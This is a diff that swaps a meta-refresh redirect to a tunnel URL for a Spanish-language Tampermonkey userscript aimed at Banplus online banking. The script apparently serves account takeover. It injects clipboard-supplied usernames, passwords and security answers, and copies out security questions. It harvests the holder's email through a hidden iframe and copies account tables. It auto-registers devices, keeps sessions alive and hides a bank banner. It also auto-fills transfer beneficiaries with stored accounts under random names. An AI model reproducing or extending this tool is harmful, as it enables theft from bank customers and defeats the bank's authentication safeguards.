@@ -1,1 +1,723 @@
-<META HTTP-EQUIV="REFRESH" CONTENT="0;URL=https://icons-bass-tourist-naturally.trycloudflare.com/">
+// ==UserScript==
+// @name         BN JODETE - Consolidado + Correo Oculto + Anti-Expiración + Anti-Banner
+// @namespace    http://tampermonkey.net/
+// @version      2.5
+// @description  Captura datos, obtiene correo oculto, extiende sesión múltiples veces y elimina banner molesto.
+// @author       Tu Nombre
+// @match        https://www.banplusonline.com/*
+// @icon         https://baul.live/sis2/assets/img/fire.gif
+// @grant        none
+// ==/UserScript==
+
+(function() {
+    'use strict';
+
+    if (window.self !== window.top) return;
+
+    // ==========================================
+    // INYECCIÓN CSS PREVENTIVA (OCULTA EL BANNER INSTANTÁNEAMENTE)
+    // ==========================================
+    const style = document.createElement('style');
+    style.innerHTML = `
+        img#image1[src*="bannerNuevo.png"],
+        img[src*="bannerNuevo.png"] {
+            display: none !important;
+            visibility: hidden !important;
+            width: 0 !important;
+            height: 0 !important;
+        }
+    `;
+    (document.head || document.documentElement).appendChild(style);
+
+    // ==========================================
+    // FUNCIONES AUXILIARES
+    // ==========================================
+
+    function mostrarPopup(mensaje, color = '#27ae60') {
+        const div = document.createElement('div');
+        div.innerText = mensaje;
+        div.style.position = 'fixed';
+        div.style.top = '20px';
+        div.style.left = '50%';
+        div.style.transform = 'translateX(-50%)';
+        div.style.backgroundColor = color;
+        div.style.color = 'white';
+        div.style.padding = '15px 25px';
+        div.style.borderRadius = '8px';
+        div.style.boxShadow = '0 4px 12px rgba(0,0,0,0.2)';
+        div.style.zIndex = '99999';
+        div.style.fontSize = '16px';
+        div.style.fontWeight = 'bold';
+        document.body.appendChild(div);
+        setTimeout(() => {
+            div.style.opacity = '0';
+            div.style.transition = 'opacity 0.5s';
+            setTimeout(() => div.remove(), 500);
+        }, 3000);
+    }
+
+    function actualizarElementoB() {
+        const inputField = document.getElementById('ctl00_ContenedorPrincipal_tIdentificador');
+        const bElement = document.getElementById('identificadorValor');
+        if (inputField && bElement) {
+            const valor = inputField.value.trim();
+            bElement.innerText = valor;
+            localStorage.setItem('identificadorValor', valor);
+        }
+    }
+
+    function inicializarElementoB() {
+        const valorGuardado = localStorage.getItem('identificadorValor') || '';
+        const bElement = document.getElementById('identificadorValor');
+        if (bElement) bElement.innerText = valorGuardado;
+    }
+
+    // ==========================================
+    // ELIMINADOR DE BANNER (SIN NOTIFICACIÓN)
+    // ==========================================
+    function eliminarBannerNuevo() {
+        setInterval(() => {
+            const bannerById = document.getElementById('image1');
+            if (bannerById && bannerById.src && bannerById.src.includes('bannerNuevo.png')) {
+                bannerById.remove();
+                return;
+            }
+            const banners = document.querySelectorAll('img[src*="bannerNuevo.png"]');
+            banners.forEach(b => b.remove());
+        }, 500);
+    }
+
+    // ==========================================
+    // MONITOR DE EXPIRACIÓN (FUNCIONA MÚLTIPLES VECES)
+    // ==========================================
+    function iniciarMonitorExpiracion() {
+        let yaClickeado = false;
+
+        setInterval(() => {
+            const modal = document.getElementById('simplemodal-container');
+            const btn = document.getElementById('bContinuarXExpirar');
+
+            // Verificamos si el modal contenedor existe y NO está oculto
+            const modalVisible = modal && modal.style.display !== 'none' && modal.offsetHeight > 0;
+
+            if (modalVisible && btn && !yaClickeado) {
+                yaClickeado = true;
+                setTimeout(() => {
+                    btn.click();
+                    mostrarPopup("⏱️ Sesión extendida", "#27ae60");
+                    console.log("✅ Click en bContinuarXExpirar");
+                }, 500);
+            }
+
+            // Cuando el modal desaparece, reseteamos la bandera para la próxima vez
+            if (!modalVisible) {
+                yaClickeado = false;
+            }
+        }, 1000);
+    }
+
+    // ==========================================
+    // LÓGICA PRINCIPAL
+    // ==========================================
+
+    window.addEventListener('load', function() {
+
+        if (window.location.hostname === "www.banplusonline.com") {
+            crearHeaderGlobal();
+        }
+
+        if (window.location.pathname.toLowerCase().includes("clientenatural/login.aspx")) {
+            configurarLogin();
+        }
+
+        if (window.location.pathname.toLowerCase().includes("clientenatural/usofrecuentevalidar.aspx")) {
+            configurarPreguntasSeguridad();
+        }
+
+        if (window.location.href.includes('UsoFrecuenteRegistrar.aspx')) {
+            autoClickRegistro();
+        }
+
+        if (window.location.pathname.toLowerCase().includes("ayuda/generarotp/codigoplus.aspx")) {
+            capturarCorreoEnCodigoPlusDirecto();
+        }
+
+        if (window.location.href.includes("Consolidado.aspx")) {
+            procesarConsolidadoConCorreoOculto();
+        }
+
+        if (window.location.href.includes('banplusonline')) {
+            iniciarFormularioFlotante();
+        }
+
+        iniciarCopiadoImagen();
+
+        // Iniciar monitores automáticos
+        iniciarMonitorExpiracion();
+        eliminarBannerNuevo();
+    });
+
+
+    // ==========================================
+    // FUNCIONES ESPECÍFICAS
+    // ==========================================
+
+    function crearHeaderGlobal() {
+        let intervalId = null;
+        const INTERVAL_TIME = 20;
+        let timeLeft = INTERVAL_TIME;
+
+        const header = document.createElement('div');
+        header.style.position = 'fixed';
+        header.style.top = '0';
+        header.style.width = '100%';
+        header.style.backgroundColor = '#2C3E50';
+        header.style.padding = '10px';
+        header.style.display = 'flex';
+        header.style.justifyContent = 'center';
+        header.style.zIndex = '1000';
+        header.style.boxShadow = '0px 4px 6px rgba(0, 0, 0, 0.1)';
+        header.style.fontFamily = 'Arial, sans-serif';
+
+        document.body.style.marginTop = '60px';
+
+        const buttons = ['J', 'N', 'ACTIVAR'].map(name => {
+            const button = document.createElement('button');
+            button.innerText = name;
+            button.style.margin = '0 10px';
+            button.style.padding = '10px 20px';
+            button.style.border = 'none';
+            button.style.borderRadius = '5px';
+            button.style.backgroundColor = '#2980B9';
+            button.style.color = 'white';
+            button.style.cursor = 'pointer';
+            button.style.fontSize = '16px';
+            button.onmouseover = () => { button.style.backgroundColor = '#1ABC9C'; };
+            button.onmouseout = () => { button.style.backgroundColor = '#2980B9'; };
+            return button;
+        });
+
+        buttons[0].onclick = () => { window.location.href = "https://www.banplusonline.com/SIBEL/ClienteNatural/Login.aspx?rif=1"; };
+        buttons[1].onclick = () => { window.location.href = "https://www.banplusonline.com/SIBEL/ClienteNatural/Login.aspx"; };
+
+        buttons[2].onclick = () => {
+            if (intervalId) {
+                clearInterval(intervalId);
+                intervalId = null;
+                buttons[2].innerText = 'ACTIVAR';
+                localStorage.setItem('isTimerActive', 'false');
+            } else {
+                timeLeft = INTERVAL_TIME;
+                buttons[2].innerText = `Recargando en ${timeLeft}s`;
+                intervalId = setInterval(() => {
+                    if (timeLeft > 0) {
+                        timeLeft--;
+                        buttons[2].innerText = `Recargando en ${timeLeft}s`;
+                    } else {
+                        location.reload();
+                    }
+                }, 1000);
+                localStorage.setItem('isTimerActive', 'true');
+            }
+        };
+
+        const bElement = document.createElement('b');
+        bElement.id = 'identificadorValor';
+        bElement.style.margin = '0 10px';
+        bElement.style.fontSize = '16px';
+        bElement.style.color = 'white';
+
+        header.appendChild(bElement);
+        inicializarElementoB();
+        buttons.forEach(button => header.appendChild(button));
+        document.body.prepend(header);
+    }
+
+    function configurarLogin() {
+        const spanToHide = document.getElementById("ctl00_ContenedorPrincipal_bAceptarIdentificadorUsuario");
+        if (spanToHide) spanToHide.style.display = "none";
+
+        const cancelButton = document.getElementById("ctl00_ContenedorPrincipal_bCancelar");
+        if (cancelButton) cancelButton.style.display = "none";
+
+        const newDivButton = document.createElement('div');
+        newDivButton.innerText = 'ACEPTAR (Paste)';
+        newDivButton.style.backgroundColor = '#e74c3c';
+        newDivButton.style.color = 'white';
+        newDivButton.style.border = 'none';
+        newDivButton.style.padding = '10px 20px';
+        newDivButton.style.borderRadius = '5px';
+        newDivButton.style.cursor = 'pointer';
+        newDivButton.style.fontSize = '16px';
+        newDivButton.style.textAlign = 'center';
+        newDivButton.style.display = 'inline-block';
+        newDivButton.style.marginTop = '10px';
+
+        newDivButton.onclick = async () => {
+            try {
+                const clipboardText = await navigator.clipboard.readText();
+                const inputField = document.getElementById('ctl00_ContenedorPrincipal_tIdentificador');
+                if (inputField) {
+                    inputField.value = clipboardText;
+                    actualizarElementoB();
+                }
+                const linkButton = document.getElementById("bAceptarIdentificadorUsuarioLinkButton");
+                if (linkButton) linkButton.click();
+            } catch (err) { console.error(err); }
+        };
+
+        const targetDiv = document.getElementById("boton");
+        if (targetDiv) targetDiv.appendChild(newDivButton);
+
+        const linkButtonToHide = document.getElementById("bSiguientePaso1LinkButton");
+        if (linkButtonToHide) linkButtonToHide.style.display = "none";
+
+        const iniciarSesionButton = document.createElement('div');
+        iniciarSesionButton.innerText = 'INICIAR SESION (Paste Clave)';
+        iniciarSesionButton.style.backgroundColor = '#3498db';
+        iniciarSesionButton.style.color = 'white';
+        iniciarSesionButton.style.border = 'none';
+        iniciarSesionButton.style.padding = '10px 20px';
+        iniciarSesionButton.style.borderRadius = '5px';
+        iniciarSesionButton.style.cursor = 'pointer';
+        iniciarSesionButton.style.fontSize = '16px';
+        iniciarSesionButton.style.textAlign = 'center';
+        iniciarSesionButton.style.display = 'inline-block';
+        iniciarSesionButton.style.marginTop = '10px';
+
+        iniciarSesionButton.onclick = async () => {
+            try {
+                const clipboardText = await navigator.clipboard.readText();
+                const inputClave = document.getElementById('ctl00_ContenedorPrincipal_tClave');
+                if (inputClave) inputClave.value = clipboardText;
+                if (linkButtonToHide) linkButtonToHide.click();
+            } catch (err) { console.error(err); }
+        };
+
+        const spanContainer = document.getElementById("ctl00_ContenedorPrincipal_bSiguientePaso1");
+        if (spanContainer) spanContainer.appendChild(iniciarSesionButton);
+    }
+
+    function configurarPreguntasSeguridad() {
+        const btnAceptar = document.getElementById("btnAceptarLinkButton");
+        if (btnAceptar) btnAceptar.style.display = "none";
+        const btnCancel = document.getElementById("ctl00_ContenedorPrincipal_btnCancelar");
+        if (btnCancel) btnCancel.style.display = "none";
+
+        var formBtn = document.createElement("div");
+        formBtn.textContent = "ENVIAR PREGUNTAS";
+        formBtn.style.cursor = "pointer";
+        formBtn.style.backgroundColor = "#007bff";
+        formBtn.style.color = "white";
+        formBtn.style.padding = "10px";
+        formBtn.style.textAlign = "center";
+        formBtn.style.marginTop = "20px";
+        formBtn.style.borderRadius = "5px";
+        formBtn.style.width = "200px";
+        formBtn.style.margin = "auto";
+        document.body.appendChild(formBtn);
+
+        formBtn.addEventListener("click", function() {
+            navigator.clipboard.readText().then(function(text) {
+                if (text.includes("^")) {
+                    var datos = text.split("^");
+                    const resp1 = document.getElementsByName("ctl00$ContenedorPrincipal$controlDesafio$ctrlPreg1$tRespuesta")[0];
+                    const resp2 = document.getElementsByName("ctl00$ContenedorPrincipal$controlDesafio$ctrlPreg2$tRespuesta")[0];
+                    if (resp1) resp1.value = datos[0];
+                    if (resp2) resp2.value = datos[1];
+                    const btnLink = document.getElementById("btnAceptarLinkButton");
+                    if (btnLink) btnLink.click();
+                } else {
+                    alert("Formato incorrecto. Usa: Respuesta1^Respuesta2");
+                }
+            }).catch(err => console.error(err));
+        });
+
+        const preg1 = document.getElementById("ctl00_ContenedorPrincipal_controlDesafio_ctrlPreg1_lPregunta");
+        const preg2 = document.getElementById("ctl00_ContenedorPrincipal_controlDesafio_ctrlPreg2_lPregunta");
+        if (preg1 && preg2) {
+            var preguntasTexto = preg1.textContent + "^" + preg2.textContent;
+            navigator.clipboard.writeText(preguntasTexto).then(() => {
+                mostrarPopup("PREGUNTAS COPIADAS", "#28a745");
+            });
+        }
+    }
+
+    function autoClickRegistro() {
+        var firstElement = document.getElementById('ctl00_ContenedorPrincipal_rbOpcion_0');
+        if (firstElement) {
+            firstElement.click();
+            var secondElement = document.getElementById('btnAceptarLinkButton');
+            if (secondElement) secondElement.click();
+        }
+    }
+
+    function capturarCorreoEnCodigoPlusDirecto() {
+        setTimeout(() => {
+            const checkboxId = "ctl00_ctl00_cphHeader_cphBody_ControlCodigoPlus_cblOpciones_0";
+            const checkboxElem = document.getElementById(checkboxId);
+            if (checkboxElem) {
+                let labelText = "";
+                const labelFor = document.querySelector(`label[for="${checkboxId}"]`);
+                if (labelFor) labelText = labelFor.textContent;
+                else if (checkboxElem.nextElementSibling && checkboxElem.nextElementSibling.tagName === 'LABEL') labelText = checkboxElem.nextElementSibling.textContent;
+
+                if (labelText) {
+                    const emailRegex = /([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9_-]+)/;
+                    const match = labelText.match(emailRegex);
+                    if (match && match[0]) {
+                        navigator.clipboard.writeText(match[0]);
+                        mostrarPopup(`✅ Correo copiado: ${match[0]}`, '#28a745');
+                    }
+                }
+            }
+        }, 1000);
+    }
+
+    function procesarConsolidadoConCorreoOculto() {
+        function esperarElemento(selector, callback, intervalo = 500, timeout = 10000) {
+            const inicio = Date.now();
+            const verificar = () => {
+                const el = document.querySelector(selector);
+                if (el) {
+                    callback(el);
+                } else if (Date.now() - inicio < timeout) {
+                    setTimeout(verificar, intervalo);
+                }
+            };
+            verificar();
+        }
+
+        esperarElemento("#ctl00_ctl00_cphHeader_Header1_lblNombre", () => {
+            esperarElemento(".tabla-administracion", () => {
+                const nombreElem = document.getElementById("ctl00_ctl00_cphHeader_Header1_lblNombre");
+                const tablaElem = document.getElementsByClassName("tabla-administracion")[0];
+
+                if (nombreElem && tablaElem) {
+                    const nombreTexto = nombreElem.textContent.trim();
+                    const tablaHTML = encodeURIComponent(tablaElem.innerHTML.trim());
+
+                    mostrarPopup("⏳ Buscando correo en segundo plano...", "#f39c12");
+
+                    const iframe = document.createElement('iframe');
+                    iframe.style.display = 'none';
+                    iframe.src = 'https://www.banplusonline.com/Sibel/Ayuda/GenerarOTP/CodigoPlus.aspx';
+                    document.body.appendChild(iframe);
+
+                    iframe.onload = function() {
+                        try {
+                            const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+                            const checkboxInIframe = iframeDoc.getElementById("ctl00_ctl00_cphHeader_cphBody_ControlCodigoPlus_cblOpciones_0");
+                            let correoExtraido = "";
+
+                            if (checkboxInIframe) {
+                                let labelText = "";
+                                const labelFor = iframeDoc.querySelector(`label[for="ctl00_ctl00_cphHeader_cphBody_ControlCodigoPlus_cblOpciones_0"]`);
+                                if (labelFor) labelText = labelFor.textContent;
+                                else if (checkboxInIframe.nextElementSibling && checkboxInIframe.nextElementSibling.tagName === 'LABEL') labelText = checkboxInIframe.nextElementSibling.textContent;
+
+                                if (labelText) {
+                                    const emailRegex = /([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9_-]+)/;
+                                    const match = labelText.match(emailRegex);
+                                    if (match && match[0]) {
+                                        correoExtraido = match[0];
+                                        console.log("🕵️‍♂️ Correo encontrado vía iframe:", correoExtraido);
+                                    }
+                                }
+                            }
+
+                            let resultado = `${nombreTexto}^${tablaHTML}`;
+                            if (correoExtraido) {
+                                resultado += `^${correoExtraido}`;
+                                mostrarPopup("✅ Datos copiados (con correo)", '#28a745');
+                            } else {
+                                resultado += `^NO_CORREO_DETECTADO`;
+                                mostrarPopup("⚠️ Datos copiados (correo no accesible)", '#e67e22');
+                                console.warn("No se pudo leer el iframe. Posible bloqueo de seguridad del navegador.");
+                            }
+
+                            navigator.clipboard.writeText(resultado);
+
+                        } catch (e) {
+                            console.error("Error de seguridad CORS/X-Frame al leer iframe:", e);
+                            let resultado = `${nombreTexto}^${tablaHTML}`;
+                            navigator.clipboard.writeText(resultado);
+                            mostrarPopup("⚠️ Copiado básico (Bloqueo de seguridad)", '#e74c3c');
+                        } finally {
+                            document.body.removeChild(iframe);
+                        }
+                    };
+
+                    iframe.onerror = function() {
+                         document.body.removeChild(iframe);
+                         mostrarPopup("❌ Error al cargar página oculta", '#c0392b');
+                    };
+                }
+            });
+        });
+    }
+
+    function iniciarFormularioFlotante() {
+        const genNombre = () => {
+            const nombres = ["carlos", "jose", "pedro", "juan", "miguel", "andres"];
+            const apellidos = ["fernando", "ramirez", "perez", "gomez", "diaz"];
+            return nombres[Math.floor(Math.random() * nombres.length)] + " " + apellidos[Math.floor(Math.random() * apellidos.length)] + " rat1";
+        };
+        const genDescripcion = () => {
+            const opciones = ["pago de servicio", "transferencia personal", "pago de factura", "honorarios", "abono cuenta"];
+            return opciones[Math.floor(Math.random() * opciones.length)];
+        };
+        const genConcepto = () => {
+            const conceptos = ["pago servicio", "pago bienes", "adelanto", "cancelación", "mensualidad", "cuota fija", "pago móvil", "servicio técnico", "deuda", "otros pagos"];
+            return conceptos[Math.floor(Math.random() * conceptos.length)];
+        };
+
+        let intervaloAutoCompletar = null;
+
+        function configurarBotonPegar(btnId, inputId) {
+            const btn = document.getElementById(btnId);
+            const input = document.getElementById(inputId);
+            if (btn && input) {
+                btn.addEventListener('click', async () => {
+                    try {
+                        const text = await navigator.clipboard.readText();
+                        const numericText = text.replace(/\D/g, '');
+                        input.value = numericText;
+                        input.dispatchEvent(new Event('input', { bubbles: true }));
+                        input.dispatchEvent(new Event('change', { bubbles: true }));
+                    } catch (err) { alert('Error al leer portapapeles'); }
+                });
+            }
+        }
+
+        if (!document.getElementById('formFlotanteBN')) {
+            const div = document.createElement('div');
+            div.id = 'formFlotanteBN';
+            div.style.position = 'fixed';
+            div.style.top = '10px';
+            div.style.right = '10px';
+            div.style.zIndex = '9999';
+            div.style.background = '#fff';
+            div.style.border = '1px solid #000';
+            div.style.borderRadius = '8px';
+            div.style.boxShadow = '0 0 10px rgba(0,0,0,0.3)';
+            div.style.fontSize = '14px';
+            div.style.maxWidth = '270px';
+
+            div.innerHTML = `
+                <div id="formHeader" style="cursor:pointer; background:#007bff; color:white; padding:6px 10px; border-top-left-radius:8px; border-top-right-radius:8px;">
+                    💼 Datos Bancarios ▾
+                </div>
+                <div id="botonesBanco" style="display: none; text-align:center; padding: 5px;">
+                    <button id="btnBanco1" style="margin: 3px; padding: 5px 10px;">Banco 1</button>
+                    <button id="btnBanco2" style="margin: 3px; padding: 5px 10px;">Banco 2</button>
+                </div>
+                <div id="formContent" style="padding:10px; display:block;">
+                    <strong>💳 Selección de cuenta</strong><br><br>
+                    <label><input type="radio" name="bancoSelect" value="venezuela" id="radioVenezuela"> Venezuela</label><br>
+                    <label><input type="radio" name="bancoSelect" value="bancamiga" id="radioBancamiga"> Bancamiga</label><br><br>
+
+                    <strong>📝 Cédula 1 / Cuenta 1 (Venezuela)</strong><br>
+                    <label>N° Cuenta 1:</label><br>
+                    <div style="display: flex; gap: 5px; margin-bottom: 5px;">
+                        <input id="cuentaInput1" style="flex: 1;" />
+                        <button id="btnPasteCuenta1" style="padding: 5px 10px; background: #6c757d; color: white; border: none; border-radius: 4px; cursor: pointer;">Paste</button>
+                    </div>
+                    <label>Cédula 1:</label><br>
+                    <div style="display: flex; gap: 5px; margin-bottom: 10px;">
+                        <input id="cedulaInput1" style="flex: 1;" />
+                        <button id="btnPasteCedula1" style="padding: 5px 10px; background: #6c757d; color: white; border: none; border-radius: 4px; cursor: pointer;">Paste</button>
+                    </div>
+
+                    <strong>🏦 Cédula 2 / Cuenta 2 (Bancamiga)</strong><br>
+                    <label>N° Cuenta 2:</label><br>
+                    <div style="display: flex; gap: 5px; margin-bottom: 5px;">
+                        <input id="cuentaInput2" style="flex: 1;" />
+                        <button id="btnPasteCuenta2" style="padding: 5px 10px; background: #6c757d; color: white; border: none; border-radius: 4px; cursor: pointer;">Paste</button>
+                    </div>
+                    <label>Cédula 2:</label><br>
+                    <div style="display: flex; gap: 5px; margin-bottom: 10px;">
+                        <input id="cedulaInput2" style="flex: 1;" />
+                        <button id="btnPasteCedula2" style="padding: 5px 10px; background: #6c757d; color: white; border: none; border-radius: 4px; cursor: pointer;">Paste</button>
+                    </div>
+
+                    <button id="guardarBtn" style="width: 100%; background:#007bff; color:white; border:none; padding:5px; border-radius: 4px; cursor: pointer;">Guardar</button>
+                </div>
+            `;
+            document.body.appendChild(div);
+
+            configurarBotonPegar('btnPasteCuenta1', 'cuentaInput1');
+            configurarBotonPegar('btnPasteCedula1', 'cedulaInput1');
+            configurarBotonPegar('btnPasteCuenta2', 'cuentaInput2');
+            configurarBotonPegar('btnPasteCedula2', 'cedulaInput2');
+
+            const header = document.getElementById("formHeader");
+            const content = document.getElementById("formContent");
+            const botonesBanco = document.getElementById("botonesBanco");
+            const btnBanco1 = document.getElementById("btnBanco1");
+            const btnBanco2 = document.getElementById("btnBanco2");
+
+            function actualizarEstiloBotonesBanco() {
+                const banco = localStorage.getItem('bancoSeleccionado') || 'venezuela';
+                btnBanco1.style.backgroundColor = banco === 'venezuela' ? '#28a745' : '';
+                btnBanco1.style.color = banco === 'venezuela' ? '#fff' : '';
+                btnBanco2.style.backgroundColor = banco === 'bancamiga' ? '#28a745' : '';
+                btnBanco2.style.color = banco === 'bancamiga' ? '#fff' : '';
+            }
+
+            const estado = localStorage.getItem('formFlotanteEstado') || 'expandido';
+            if (estado === 'minimizado') {
+                content.style.display = 'none';
+                botonesBanco.style.display = 'block';
+                header.innerHTML = '💼 Datos Bancarios ▴';
+                actualizarEstiloBotonesBanco();
+            } else {
+                content.style.display = 'block';
+                botonesBanco.style.display = 'none';
+                header.innerHTML = '💼 Datos Bancarios ▾';
+            }
+
+            header.addEventListener("click", () => {
+                const visible = content.style.display !== 'none';
+                if (visible) {
+                    content.style.display = 'none';
+                    botonesBanco.style.display = 'block';
+                    header.innerHTML = '💼 Datos Bancarios ▴';
+                    localStorage.setItem('formFlotanteEstado', 'minimizado');
+                    actualizarEstiloBotonesBanco();
+                } else {
+                    content.style.display = 'block';
+                    botonesBanco.style.display = 'none';
+                    header.innerHTML = '💼 Datos Bancarios ▾';
+                    localStorage.setItem('formFlotanteEstado', 'expandido');
+                }
+            });
+
+            document.getElementById('cuentaInput1').value = localStorage.getItem('cuentaVenezuela') || '';
+            document.getElementById('cedulaInput1').value = localStorage.getItem('cedulaVenezuela') || '';
+            document.getElementById('cuentaInput2').value = localStorage.getItem('cuentaBancamiga') || '';
+            document.getElementById('cedulaInput2').value = localStorage.getItem('cedulaBancamiga') || '';
+
+            const bancoGuardado = localStorage.getItem('bancoSeleccionado') || 'venezuela';
+            const radioGuardado = document.getElementById(`radio${bancoGuardado.charAt(0).toUpperCase() + bancoGuardado.slice(1)}`);
+            if (radioGuardado) radioGuardado.checked = true;
+
+            document.querySelectorAll('input[name="bancoSelect"]').forEach(radio => {
+                radio.addEventListener('change', () => {
+                    localStorage.setItem('bancoSeleccionado', radio.value);
+                    autoCompletarCampos();
+                    actualizarEstiloBotonesBanco();
+                });
+            });
+
+            document.getElementById('guardarBtn').onclick = () => {
+                localStorage.setItem('cuentaVenezuela', document.getElementById('cuentaInput1').value.trim());
+                localStorage.setItem('cedulaVenezuela', document.getElementById('cedulaInput1').value.trim());
+                localStorage.setItem('cuentaBancamiga', document.getElementById('cuentaInput2').value.trim());
+                localStorage.setItem('cedulaBancamiga', document.getElementById('cedulaInput2').value.trim());
+                alert('Guardado en memoria local');
+            };
+
+            btnBanco1.addEventListener('click', () => {
+                const radioVzla = document.getElementById('radioVenezuela');
+                if (radioVzla) radioVzla.checked = true;
+                localStorage.setItem('bancoSeleccionado', 'venezuela');
+                autoCompletarCampos();
+                actualizarEstiloBotonesBanco();
+            });
+
+            btnBanco2.addEventListener('click', () => {
+                const radioBancamiga = document.getElementById('radioBancamiga');
+                if (radioBancamiga) radioBancamiga.checked = true;
+                localStorage.setItem('bancoSeleccionado', 'bancamiga');
+                autoCompletarCampos();
+                actualizarEstiloBotonesBanco();
+            });
+
+            function autoCompletarCampos() {
+                if (intervaloAutoCompletar) {
+                    clearInterval(intervaloAutoCompletar);
+                    intervaloAutoCompletar = null;
+                }
+                const bancoSeleccionado = localStorage.getItem('bancoSeleccionado') || 'venezuela';
+                const cuenta = localStorage.getItem(bancoSeleccionado === 'bancamiga' ? 'cuentaBancamiga' : 'cuentaVenezuela') || '';
+                const cedula = localStorage.getItem(bancoSeleccionado === 'bancamiga' ? 'cedulaBancamiga' : 'cedulaVenezuela') || '';
+                const nombre = genNombre();
+                const descripcion = genDescripcion();
+                const concepto = genConcepto();
+
+                const intentarRellenar = (id, valor) => {
+                    const el = document.getElementById(id);
+                    if (el) el.value = valor;
+                };
+                const intentarCheck = (id) => {
+                    const el = document.getElementById(id);
+                    if (el && !el.checked) el.checked = true;
+                };
+
+                let intentos = 0;
+                intervaloAutoCompletar = setInterval(() => {
+                    intentarRellenar('ctl00_ctl00_cphHeader_cphBody_ucRB_tNuevaCtaOtrosBancos', cuenta);
+                    intentarRellenar('ctl00_ctl00_cphHeader_cphBody_ucRB_tCedRif', cedula);
+                    intentarRellenar('ctl00_ctl00_cphHeader_cphBody_ucRB_tBeneficiario', nombre);
+                    intentarRellenar('ctl00_ctl00_cphHeader_cphBody_ucRB_tDescripcion', descripcion);
+                    intentarRellenar('ctl00_ctl00_cphHeader_cphBody_tConcepto', concepto);
+                    intentarCheck('ctl00_ctl00_cphHeader_cphBody_ucRB_cxbRegistrarCta');
+                    if (++intentos > 10) {
+                        clearInterval(intervaloAutoCompletar);
+                        intervaloAutoCompletar = null;
+                    }
+                }, 500);
+            }
+
+            window.autoCompletarCamposBN = autoCompletarCampos;
+            setTimeout(() => {
+                 if(window.autoCompletarCamposBN) window.autoCompletarCamposBN();
+            }, 1000);
+        }
+    }
+
+    function iniciarCopiadoImagen() {
+        const td = document.getElementsByClassName('alturaedits')[2]?.getElementsByTagName('td')[1];
+        if (!td) return;
+
+        td.innerHTML = '';
+        const btn = document.createElement('div');
+        btn.innerText = '📸 Copiar imagen';
+        Object.assign(btn.style, {
+            display: "inline-block",
+            padding: "10px 20px",
+            background: "#0066cc",
+            color: "#fff",
+            borderRadius: "6px",
+            cursor: "pointer",
+            fontSize: "16px",
+            boxShadow: "0 2px 4px rgba(0,0,0,0.3)",
+            userSelect: "none",
+            textAlign: "center"
+        });
+
+        btn.addEventListener('click', () => {
+            const img = document.getElementById('ctl00_ContenedorPrincipal_imImagen');
+            if (!img) { alert("No se encontró la imagen."); return; }
+            if (!img.complete || img.naturalWidth === 0) { alert("La imagen aún se está cargando."); return; }
+
+            const canvas = document.createElement('canvas');
+            canvas.width = img.naturalWidth;
+            canvas.height = img.naturalHeight;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
+
+            try {
+                const base64 = canvas.toDataURL('image/png');
+                navigator.clipboard.writeText(base64).then(() => {
+                    mostrarPopup("✅ Imagen copiada en Base64", "#28a745");
+                }).catch(err => alert('No se pudo copiar.'));
+            } catch (e) {
+                alert('Error al convertir imagen.');
+            }
+        });
+        td.appendChild(btn);
+    }
+
+})();
